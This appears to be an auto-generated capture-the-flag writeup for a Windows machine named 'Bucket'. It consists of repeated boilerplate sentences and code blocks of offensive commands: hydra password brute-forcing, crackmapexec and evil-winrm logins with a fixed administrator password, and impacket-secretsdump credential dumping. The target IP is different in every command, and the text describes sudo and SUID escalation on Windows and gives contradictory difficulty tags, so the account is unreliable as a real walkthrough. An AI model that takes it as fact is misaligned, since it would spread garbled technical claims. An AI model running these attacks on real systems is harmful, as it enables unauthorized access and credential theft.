---
TitleSEO: "PwnTillDawn — Bucket (Insane Windows) | ZureFX"
TitlePost: "PwnTillDawn — Bucket (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Bucket. DNS Rebinding and SUID Binary to achieve insane compromise on Windows."
Keywords: "hard, easy, medium"
URL: "https://zurefx.github.io/writeups/htb-bucket-882.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-bucket-882/"
Date: "2025-02-06"
Tags: "Hard, Easy, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-bucket-882"
Permalink: "/writeups/htb-bucket-882.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Bucket** is rated **Insane** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.73.243.98`.

### Objectives

The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.62.157.181 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.67.208.39 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.43.112.164 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

```bash
nmap -sCV -p143,21,443 10.115.208.111 -oN scan.txt
evil-winrm -i 10.63.107.126 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

### SMB Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.95.109.109 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5986,143,993 10.105.40.244 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.85.38.110 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

Key finding: **DNS Rebinding**.

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

### Initial Access

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.24.67.199 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.139.241 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

```powershell
crackmapexec smb 10.57.185.241 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.251.51
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.100.110 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.91.142.130 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `sharphound`
- `psexec`
- `pwncat`
- `GetUserSPNs`
- `atexec`
- `lookupsid`
- `john`

### Key Takeaways

- DNS Rebinding
- SUID Binary
